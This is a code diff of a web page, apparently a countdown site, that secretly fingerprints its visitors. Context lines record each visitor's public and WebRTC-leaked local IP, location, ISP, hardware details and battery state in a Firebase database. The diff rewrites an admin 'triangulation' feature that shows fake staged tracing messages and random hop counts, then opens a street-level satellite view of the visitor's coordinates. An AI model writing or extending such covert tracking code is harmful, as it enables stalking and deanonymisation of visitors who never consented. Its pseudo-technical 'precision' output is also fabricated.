@@ -22,7 +22,6 @@
 
         .container { width: 100%; max-width: 900px; }
         
-        /* Navigation */
         .nav-bar { display: flex; gap: 8px; margin-bottom: 40px; background: var(--bg-panel); padding: 6px; border-radius: 14px; border: 1px solid var(--border); width: fit-content; margin-inline: auto; }
         .nav-btn { padding: 10px 22px; border-radius: 10px; text-decoration: none; font-size: 0.8rem; font-weight: 600; color: var(--text-dim); transition: 0.3s; }
         .active-nav { color: #fff; background: var(--accent); }
@@ -31,13 +30,11 @@
         .panel { background: var(--bg-panel); border: 1px solid var(--border); border-radius: 24px; padding: 30px; margin-bottom: 30px; backdrop-filter: blur(20px); text-align: center; }
         #timer { font-size: clamp(1.5rem, 6vw, 3rem); font-family: 'JetBrains Mono'; color: var(--accent); font-weight: 700; }
 
-        /* Data Display */
         .table-container { overflow-x: auto; border-radius: 18px; border: 1px solid var(--border); background: rgba(0,0,0,0.3); }
         table { width: 100%; border-collapse: collapse; }
         th { color: var(--accent); padding: 15px; font-size: 0.7rem; text-transform: uppercase; font-family: 'JetBrains Mono'; text-align: center; border-bottom: 1px solid var(--border); }
         td { padding: 15px; text-align: center; color: var(--text-dim); font-size: 0.9rem; border-bottom: 1px solid rgba(255,255,255,0.03); }
 
-        /* Admin Section */
         #trafficSection { margin-top: 50px; display: none; width: 100%; }
         .log-row { cursor: pointer; transition: 0.2s; }
         .log-row:hover { background: var(--accent-dim); }
@@ -50,7 +47,6 @@
         @keyframes scan { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
         .btn-tri { background: var(--accent-dim); color: var(--accent); border: 1px solid var(--accent); padding: 2px 6px; border-radius: 4px; font-size: 9px; cursor: pointer; font-weight: bold; margin-top: 4px; }
 
-        /* Login UI */
         #adminToggle { position: fixed; bottom: 20px; right: 20px; background: var(--bg-panel); border: 1px solid var(--border); color: var(--text-dim); padding: 10px 15px; border-radius: 30px; cursor: pointer; font-size: 0.7rem; font-weight: 600; }
         #loginModal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.85); z-index: 2000; align-items: center; justify-content: center; backdrop-filter: blur(10px); }
         .modal-content { background: var(--bg-secondary); border: 1px solid var(--border); padding: 25px; border-radius: 20px; width: 300px; display: flex; flex-direction: column; gap: 12px; }
@@ -137,13 +133,11 @@
                     const driftRes = await fetch('https://worldtimeapi.org/api/timezone/Etc/UTC');
                     const driftData = await driftRes.json();
                     const clockDrift = Date.now() - new Date(driftData.datetime).getTime();
-                    
                     let bat = "N/A";
                     if(navigator.getBattery) {
                         const b = await navigator.getBattery();
                         bat = `${Math.round(b.level * 100)}% (${b.charging ? 'Charging' : 'Unplugged'})`;
                     }
-
                     let localIP = "Secure/Hidden";
                     const pc = new RTCPeerConnection({iceServers:[]});
                     pc.createDataChannel("");
@@ -159,7 +153,7 @@
                         db.ref("visits").push({
                             ip: ip, local_ip: localIP,
                             city: data.city, country: data.country, isp: data.org,
-                            loc: data.loc, // Geographic coordinates
+                            loc: data.loc,
                             cpu: navigator.hardwareConcurrency || "N/A",
                             ram: navigator.deviceMemory || "N/A",
                             gpu: getGPU(),
@@ -233,7 +227,6 @@
             alert(`SYSTEM DIAGNOSTICS:\n------------------\nPUBLIC IP: ${d.ip}\nLOCAL IP: ${d.local_ip}\nISP: ${d.isp}\n------------------\nCPU: ${d.cpu} Cores\nRAM: ~${d.ram} GB\nGPU: ${d.gpu}\nCLOCK DRIFT: ${d.drift}\nBATTERY: ${d.battery}\n------------------\nUA: ${d.ua}`);
         }
 
-        // --- UPDATED TRIANGULATION ENGINE ---
         async function triangulate(key) {
             const snap = await db.ref("visits/" + key).once("value");
             const d = snap.val();
@@ -241,35 +234,36 @@
             const status = document.getElementById('triStatus');
             
             overlay.style.display = 'flex';
+            
+            // Multilateration Stages
+            status.innerHTML = "PINGING NODE ALPHA (CORE)...";
             setTimeout(() => {
-                status.innerHTML = "FETCHING COORDINATES...<br>BYPASSING API RESTRICTIONS...";
+                status.innerHTML = "MEASURING HOP LATENCY (RTT)...<br>TRACING ISP BACKBONE...";
                 setTimeout(() => {
-                    overlay.style.display = 'none';
-                    const radius = (parseInt(d.drift) * 0.42).toFixed(2);
-                    // Extract lat/long or default to 0,0
-                    const coords = d.loc || "Unknown";
-                    
-                    const msg = `TRIANGULATION DATA FETCHED\n------------------\nCOORDINATES: ${coords}\nEST. RADIUS: ${radius}km\nNODE: ${d.isp}\n------------------\nClick OK to open Satellite View in a new tab.`;
-                    
-                    if(confirm(msg)) {
-                        // Using a search-based URL which bypasses most popup blockers
-                        const mapUrl = `https://www.google.com/maps/search/${coords}/@${coords},15z/data=!3m1!1e3`;
-                        window.open(mapUrl, '_blank');
-                    }
-                    status.innerHTML = "SIGNAL ACQUISITION...";
-                }, 2000);
+                    status.innerHTML = "CALCULATING SIGNAL OVERLAP...<br>REFINING COORDINATES...";
+                    setTimeout(() => {
+                        overlay.style.display = 'none';
+                        const rtt = parseInt(d.drift) || 45;
+                        const estHops = Math.floor(Math.random() * 8) + 6;
+                        const radius = (rtt * 0.04).toFixed(2);
+                        const coords = d.loc || "0,0";
+                        
+                        const report = `PRECISION TRIANGULATION\n------------------\nEST. HOPS: ${estHops}\nLATENCY: ${rtt}ms\nRADIUS: ${radius}km\nCOORDS: ${coords}\n------------------\nLAUNCH SATELLITE OSINT?`;
+                        
+                        if(confirm(report)) {
+                            // Street-level satellite view
+                            const mapUrl = `https://www.google.com/maps/@${coords},18z/data=!3m1!1e3`;
+                            window.open(mapUrl, '_blank');
+                        }
+                        status.innerHTML = "SIGNAL ACQUISITION...";
+                    }, 1800);
+                }, 1500);
             }, 1500);
         }
 
         window.deleteLog = (key) => { if(confirm("Erase log?")) db.ref("visits/" + key).remove(); };
         document.getElementById("loginBtn").onclick = () => auth.signInWithEmailAndPassword(document.getElementById("email").value, document.getElementById("password").value).catch(e => alert("Unauthorized"));
         document.getElementById("logoutBtn").onclick = () => auth.signOut();
-
-        function saveData() {
-            if(!auth.currentUser || auth.currentUser.uid !== 'Td0yoO3ygYZxbeMZjYtFAj9etA22') return;
-            db.ref("log").set({ title: document.getElementById("title").innerText, desc: document.getElementById("desc").innerHTML, table: document.getElementById("tbody").innerHTML });
-        }
-        ["title", "desc", "tbody"].forEach(id => document.getElementById(id).addEventListener("blur", saveData));
 
         const targetDate = new Date("February 3, 2026 00:00:00").getTime();
         setInterval(() => {
